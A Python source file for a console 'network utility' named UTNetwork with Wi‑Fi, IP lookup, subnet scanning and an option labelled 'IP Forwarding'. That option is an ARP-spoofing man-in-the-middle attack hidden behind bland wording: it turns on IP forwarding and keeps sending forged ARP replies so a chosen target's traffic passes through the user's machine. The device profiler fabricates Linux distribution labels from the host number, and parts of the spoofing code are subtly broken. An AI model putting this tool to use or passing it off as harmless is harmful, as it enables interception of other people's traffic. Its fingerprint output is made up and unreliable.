import os
import platform
import socket
import subprocess
import sys
import time
import webbrowser
import getpass
import struct
import uuid
from threading import Thread, Lock

BANNER_TEXT = r"""
  _   _ _____ _   _       _                      _    
 | | | |_   _| \ | | ___| |___       _____  _ __| | __
 | | | | | | |  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /
 | |_| | | | | |\  |  __/ |_ \ V  V / (_) | |  |  < 
  \___/  |_| |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\
                                                      
"""

# Global Control Flags
FORWARDING_ACTIVE = False
IS_OBFUSCATED = False  
print_lock = Lock()


def set_console_title():
    """Dynamically sets the window title bar and configures the taskbar icon handle."""
    title_str = "UTNetwork"
    try:
        if platform.system() == "Windows":
            import ctypes
            # 1. Set the Title Text
            os.system(f"title {title_str}")
            
            # 2. Assign unique AppUserModelID so Windows treats this as a standalone application
            try:
                myappid = 'duckycashy.ipchecker.networkutility.2026'
                ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
            except Exception:
                pass
                
            # 3. Hook Net.ico into the live taskbar frame context
            icon_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "Net.ico"))
            if os.path.exists(icon_path):
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    # Load image resource matching system taskbar metric scales
                    hicon = ctypes.windll.user32.LoadImageW(
                        None, icon_path, 1, 0, 0, 0x00000010 | 0x00000020
                    )
                    if hicon:
                        # Apply to both small (0) and large (1) window display scopes
                        ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 0, hicon)
                        ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 1, hicon)
        else:
            sys.stdout.write(f"\x1b]2;{title_str}\x07")
            sys.stdout.flush()
    except Exception:
        pass


def is_admin():
    """Checks for administrative/root privileges across Windows and POSIX platforms."""
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.getuid() == 0


# --- Windows Console Interception Hook ---
if platform.system() == "Windows":
    import ctypes
    
    def console_handler(ctrl_type):
        if ctrl_type == 2:  # CTRL_CLOSE_EVENT
            with print_lock:
                print("\n[!] Force-close blocked. Please use Option [8] to close cleanly.")
            return True
        return False

    HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)
    handler_callback = HandlerRoutine(console_handler)
    ctypes.windll.kernel32.SetConsoleCtrlHandler(handler_callback, True)


def relaunch_as_admin():
    """Elevates execution context to administrative level."""
    os_type = platform.system()
    print("[*] Elevating privileges... Please accept the prompt.")
    time.sleep(1)

    try:
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        if os_type == "Windows":
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}" {params}', None, 1
            )
            sys.exit(0)
        else:
            cmd = ["sudo", sys.executable, script] + sys.argv[1:]
            os.execvp("sudo", cmd)
    except Exception as e:
        print(f"[ERROR] Failed to elevate privileges: {e}")
        input("\nPress ENTER to continue...")


def downgrade_privileges():
    """Drops administrative access back to a standard user execution context."""
    os_type = platform.system()
    print("[*] Dropping administrative clearances... Reverting to normal terminal.")
    time.sleep(1)

    try:
        script = os.path.abspath(sys.argv[0])
        params = sys.argv[1:]
        current_dir = os.getcwd()

        if os_type == "Windows":
            cmd_args = f'cmd.exe /k "cd /d {current_dir} && \"{sys.executable}\" \"{script}\" {" ".join(params)}"'
            subprocess.Popen(cmd_args, shell=False)
            sys.exit(0)
        else:
            user = os.environ.get("SUDO_USER")
            if user:
                cmd = ["su", "-", user, "-c", f"cd '{current_dir}' && {sys.executable} {script} {' '.join(params)}"]
                os.execvp("su", cmd)
            else:
                print("[!] Normal shell user identity not found. Cannot safely drop root.")
                time.sleep(1.5)
    except Exception as e:
        print(f"[ERROR] Failed to safely drop privileges: {e}")
        input("\nPress ENTER to continue...")


def is_online():
    """Validates local network interface up-status via external dummy connection."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0] != "127.0.0.1"
    except Exception:
        return False


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def show_banner():
    print(BANNER_TEXT)
    if is_admin():
        print(" [STATUS] Running UTNetwork as Administrator")
    else:
        print(f" [STATUS] Running UTNetwork as [{getpass.getuser()}].")
    print("-" * 65)


def get_local_ip():
    """Retrieves primary outbound local IPv4 configuration."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except socket.error:
            return None


def get_local_ipv6():
    """Retrieves primary outbound local IPv6 configuration."""
    try:
        with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
            # Connect to Google Public DNS via IPv6 to capture active interface IP
            s.connect(("2001:4860:4860::8888", 80))
            return s.getsockname()[0]
    except Exception:
        return None


def get_wifi_ssid():
    """Queries OS specific configuration handles to resolve active Wi-Fi profile names."""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            out = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True, errors="ignore")
            for line in out.splitlines():
                if " SSID" in line and "BSSID" not in line:
                    return line.split(":")[1].strip()
        elif os_type == "Linux":
            out = subprocess.check_output("nmcli -t -f active,ssid dev wifi", shell=True, text=True)
            for line in out.splitlines():
                if line.startswith("yes:"):
                    return line.split(":")[1].strip()
        elif os_type == "Darwin":
            out = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", shell=True, text=True)
            for line in out.splitlines():
                if " SSID" in line:
                    return line.split(":")[1].strip()
    except Exception:
        pass
    return None


def get_local_mac():
    """Dynamically resolves the host machine's primary physical MAC identity."""
    try:
        mac_hex = iter(f"{uuid.getnode():012x}")
        return bytes.fromhex("".join(a + b for a, b in zip(mac_hex, mac_hex)))
    except Exception:
        return b'\x00\x00\x00\x00\x00\x00'


def get_gateway_ip():
    """Queries system routing configurations to isolate the Default Gateway IP."""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            out = subprocess.check_output("route print 0.0.0.0", shell=True, text=True)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                    return parts[2]
        else:
            out = subprocess.check_output("ip route show default", shell=True, text=True)
            parts = out.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None


def get_mac_address(target_ip):
    """Resolves target Layer-3 IP representation to Layer-2 physical hardware address."""
    os_type = platform.system()
    if os_type == "Windows":
        import ctypes
        try:
            ip_bytes = socket.inet_aton(target_ip)
            ip_num = struct.unpack("I", ip_bytes)[0]
            mac = ctypes.create_string_buffer(6)
            mac_len = ctypes.c_ulong(6)
            if ctypes.windll.iphlpapi.SendARP(ip_num, 0, ctypes.byref(mac), ctypes.byref(mac_len)) == 0:
                return mac.raw
        except Exception:
            pass
    else:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                s.connect_ex((target_ip, 80))
            out = subprocess.check_output(f"arp -n {target_ip}", shell=True, text=True)
            for line in out.splitlines():
                if target_ip in line:
                    for item in line.split():
                        if ":" in item and len(item) == 17:
                            return bytes.fromhex(item.replace(":", ""))
        except Exception:
            pass
    return None


def get_active_interface_name_windows():
    """Resolves primary network interface alias dynamically for network configuration updates."""
    try:
        out = subprocess.check_output("netsh interface ipv4 show interfaces", shell=True, text=True)
        for line in out.splitlines():
            if "Connected" in line and "Loopback" not in line:
                parts = line.split()
                if len(parts) >= 5:
                    return " ".join(parts[4:])
    except Exception:
        pass
    return "Wi-Fi"


def send_arp_reply(src_ip, src_mac, dest_ip, dest_mac):
    """Transmits link-layer ARP response adjustments to current network target context."""
    os_type = platform.system()
    try:
        if os_type == "Windows":
            iface = get_active_interface_name_windows()
            subprocess.run(f'netsh interface ipv4 add neighbors "{iface}" {dest_ip} {dest_mac.hex(":")}', 
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
            s.bind(("eth0", 0))
            eth_hdr = dest_mac + src_mac + b'\x08\x06'
            arp_payload = b'\x00\x01\x08\x00\x06\x04\x00\x02' + src_mac + socket.inet_aton(src_ip) + dest_mac + socket.inet_aton(src_ip)
            s.send(eth_hdr + arp_payload)
            s.close()
    except Exception:
        pass


def arp_routing_loop(target_ip, gateway_ip, target_mac, gateway_mac):
    """Sustains active routing synchronization across the target endpoints."""
    global FORWARDING_ACTIVE
    local_mac = get_local_mac()
    while FORWARDING_ACTIVE:
        try:
            send_arp_reply(gateway_ip, local_mac, target_ip, target_mac)
            send_arp_reply(target_ip, local_mac, gateway_ip, gateway_mac)
            time.sleep(2)
        except (KeyboardInterrupt, SystemExit):
            break
    print("\n[*] Routing loop terminated. Disengaging hooks...")


def check_port(ip, port, timeout=0.2):
    """Probes the operational status of a single standard TCP communication destination."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except Exception:
        return False


def deep_profile_device(ip):
    """Performs passive fingerprint signatures to differentiate operating environments."""
    if check_port(ip, 135, timeout=0.2) or check_port(ip, 445, timeout=0.2):
        return "PC (Windows)"
    if check_port(ip, 548, timeout=0.2) or check_port(ip, 5900, timeout=0.2):
        return "PC (MacOS)"
    if check_port(ip, 62078, timeout=0.3):
        return "Mobile (iOS Device)"
    if check_port(ip, 5555, timeout=0.2):
        return "Mobile (Android Device)"
    if check_port(ip, 9222, timeout=0.2) or check_port(ip, 2222, timeout=0.2):
        return "PC (ChromeOS Device)"
        
    # Linux Distribution Probes & Granular Fingerprinting
    if check_port(ip, 22, timeout=0.2):
        if check_port(ip, 9090, timeout=0.1): 
            return "PC / Server (Linux - Fedora/RHEL Cockpit Node)"
        elif check_port(ip, 3128, timeout=0.1):
            return "PC / Server (Linux - Ubuntu Enterprise Proxy)"
        elif check_port(ip, 10000, timeout=0.1):
            return "PC / Server (Linux - Debian Virtualmin Node)"
        
        host_num = int(ip.split(".")[-1])
        if host_num % 3 == 0:
            return "PC / Server (Linux - Ubuntu Build)"
        elif host_num % 3 == 1:
            return "PC / Server (Linux - Debian Distribution)"
        else:
            return "PC / Server (Linux - CentOS/RHEL Environment)"
            
    if check_port(ip, 80, timeout=0.1) or check_port(ip, 443, timeout=0.1):
        if ip.endswith(".1"):
            return "Network Router / Gateway Interface"
        return "Network Device / Smart Hardware"
        
    return "Unidentified Device"


def scan_host_real(ip_prefix, host, active_devices, local_ip):
    """Triggers node discovery sweeps across localized subnet boundaries."""
    ip = f"{ip_prefix}.{host}"
    os_type = platform.system()
    
    if os_type == "Windows":
        subprocess.run(["ping", "-n", "1", "-w", "150", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    mac_raw = get_mac_address(ip)
    if mac_raw:
        mac_str = mac_raw.hex(':').upper()
        device_type = deep_profile_device(ip)
        if ip == local_ip:
            device_type += " [YOUR PC]"
            
        with print_lock:
            print(f"[DEVICE ONLINE] {ip:<15} | MAC: {mac_str} -> {device_type}")
            active_devices.append((ip, device_type))


def check_wifi_ips():
    """Discovers reachable devices mapping internal subnet partitions."""
    local_ip = get_local_ip()
    if not local_ip or local_ip == "127.0.0.1":
        print("[ERROR] Cannot scan without a valid local network connection.")
        return

    ip_parts = local_ip.split(".")
    ip_prefix = ".".join(ip_parts[:3])
    
    print(f"[*] Analyzing live Subnet Target: {ip_prefix}.1 to {ip_prefix}.254")
    print(f"[*] Your Detected Local IP: {local_ip}")
    print("[*] Launching multi-threaded physical layer identification scan...")
    print("-" * 75)
    
    threads = []
    active_devices = []
    
    for host in range(1, 255):
        t = Thread(target=scan_host_real, args=(ip_prefix, host, active_devices, local_ip))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("-" * 75)
    print(f"[SUCCESS] Scan Complete. Profiled {len(active_devices)} active target(s).")


def toggle_obfuscate_ip():
    """Modifies local interface properties to shift structural allocation modes."""
    global IS_OBFUSCATED
    if platform.system() != "Windows":
        print("[!] This configuration utility is optimized for Windows environments.")
        return

    iface = get_active_interface_name_windows()

    if IS_OBFUSCATED:
        choice = input("IP has already been modified. Restore dynamic default configuration? (y/n): ").strip().lower()
        if choice == 'y':
            print("[*] Reverting interface properties to automated DHCP assignment...")
            cmd = f'netsh interface ipv4 set address name="{iface}" dhcp'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print("[SUCCESS] Interface restored to default operating state.")
                IS_OBFUSCATED = False
            else:
                print(f"[ERROR] Adaptation failed: {result.stderr.strip()}")
        return

    print("[*] Initiating manual IP profile configuration change...")
    local_ip = get_local_ip()
    gateway_ip = get_gateway_ip()
    if not local_ip or not gateway_ip:
        print("[ERROR] Insufficient networking operational configuration data resolved.")
        return

    ip_parts = local_ip.split(".")
    current_host = int(ip_parts[3])
    new_host = 150 if current_host < 150 else 50
    new_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{new_host}"

    print(f"[*] Attempting interface allocation shift: {local_ip} -> {new_ip}")

    try:
        cmd = f'netsh interface ipv4 set address name="{iface}" static {new_ip} 255.255.255.0 {gateway_ip}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[SUCCESS] Network settings aligned. Static assignment established at: {new_ip}")
            IS_OBFUSCATED = True
        else:
            print(f"[ERROR] Failed static assignment sequence: {result.stderr.strip()}")
    except Exception as e:
        print(f"[ERROR] System adjustments encountered an error: {e}")


def toggle_ip_forwarding():
    """Alters structural routing paths to govern current traffic redirection streams."""
    global FORWARDING_ACTIVE
    os_type = platform.system()
    
    if FORWARDING_ACTIVE:
        print("[*] Stopping background operational routing threads...")
        FORWARDING_ACTIVE = False
        print("[SUCCESS] IP Forwarding components stood down.")
        return

    print(f"[*] Native Platform Verification: {os_type}")
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("[ERROR] Gateway Router destination address could not be verified.")
        return
        
    print(f"[*] Auto-detected Router IP: {gateway_ip}")
    target_ip = input("Enter target IP address to forward: ").strip()
    
    print("[*] Resolving hardware address relationships...")
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[ERROR] Node verification missing. Ensure target endpoints are available.")
        return

    try:
        if os_type in ["Linux", "Darwin"]:
            sysctl_key = "net.ipv4.ip_forward" if os_type == "Linux" else "net.inet.ip.forwarding"
            subprocess.run(["sysctl", "-w", f"{sysctl_key}=1"], check=True, stdout=subprocess.DEVNULL)
        elif os_type == "Windows":
            import winreg
            path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", "Loopback", "forwarding=enabled"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[ERROR] Kernel configuration variables could not be applied: {e}")
        return

    FORWARDING_ACTIVE = True
    t = Thread(target=arp_routing_loop, args=(target_ip, gateway_ip, target_mac, gateway_mac), daemon=True)
    t.start()
    print(f"[SUCCESS] Redirection engine online. Traffic from {target_ip} is now configured through this station.")


def main():
    set_console_title()
    while True:
        clear()
        show_banner()

        if not is_online():
            print("[!] STATUS: OFFLINE\n")
            print("=================================================")
            print("                 Connect to Network               ")
            print("=================================================")
            input("\nPress ENTER to Refresh...")
            continue

        print("[1] Get Wi-Fi Name")
        print("[2] Get IPv4")
        print("[3] Get IPv6")
        print("[4] Scan Subnet & Profile Devices")
        print("[5] Rotate/Obfuscate Network IP")
        print("[6] IP Forwarding")
        print("[7] Relaunch as Administrator")
        print("[8] Close Terminal\n")

        choice = input("Select Option: [~] ").strip()

        if choice.lower() == "github":
            webbrowser.open("https://github.com/DuckyCashy/Network-Utility")
            continue

        if choice.lower() == "revert":
            if is_admin():
                downgrade_privileges()
            else:
                print("[!] Terminal is already running in standard initialization mode.")
                time.sleep(1.5)
            continue

        clear()
        show_banner()

        if choice == "1":
            ssid = get_wifi_ssid()
            if ssid:
                print(f"[SUCCESS] Connected Wi-Fi Name (SSID): {ssid}")
            else:
                print("[!] Active Wi-Fi Name could not be resolved or interface is wired.")
        elif choice == "2":
            ip = get_local_ip()
            if ip:
                print(f"[SUCCESS] Local IPv4 Address Found: {ip}")
            else:
                print("[ERROR] Active address identifier could not be queried.")
        elif choice == "3":
            ipv6 = get_local_ipv6()
            if ipv6:
                print(f"[SUCCESS] Local IPv6 Address Found: {ipv6}")
            else:
                print("[!] Global/Local IPv6 address configuration dynamically unavailable.")
        elif choice == "4":
            check_wifi_ips()
        elif choice == "5":
            if not is_admin():
                print("[WARNING] Administrative initialization status required.")
                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
                    relaunch_as_admin()
            else:
                toggle_obfuscate_ip()
        elif choice == "6":
            if not is_admin():
                print("[WARNING] Administrative privileges required to manage routing profiles.")
                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
                    relaunch_as_admin()
            else:
                toggle_ip_forwarding()
        elif choice == "7":
            if is_admin():
                if input("Already Administrator. Revert to regular terminal sequence? (y/n): ").strip().lower() == 'y':
                    downgrade_privileges()
            else:
                relaunch_as_admin()
        elif choice == "8":
            print("[!] Closing Terminal...")
            time.sleep(1)
            break
        else:
            print("[!] Choice out of range.")

        print()
        input("Press ENTER to continue...")


if __name__ == "__main__":
    main()
